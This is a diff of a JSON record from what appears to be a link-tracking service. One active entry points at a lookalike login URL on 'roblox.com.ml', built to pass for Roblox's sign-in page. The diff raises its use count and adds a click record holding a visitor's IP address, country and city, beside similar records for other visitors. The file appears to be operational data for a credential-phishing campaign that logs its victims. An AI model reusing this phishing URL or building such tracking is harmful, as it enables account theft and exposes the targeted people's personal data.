@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 263,
+    "useCount": 264,
     "createdBy": "admin",
     "clicks": [
       {
@@ -2216,6 +2216,14 @@
         "city": "Washington",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777002697478,
+        "ip": "189.90.234.160",
+        "country": "Brazil",
+        "city": "Várzea Grande",
+        "flag": "🇧🇷",
+        "countryCode": "BR"
       }
     ]
   },
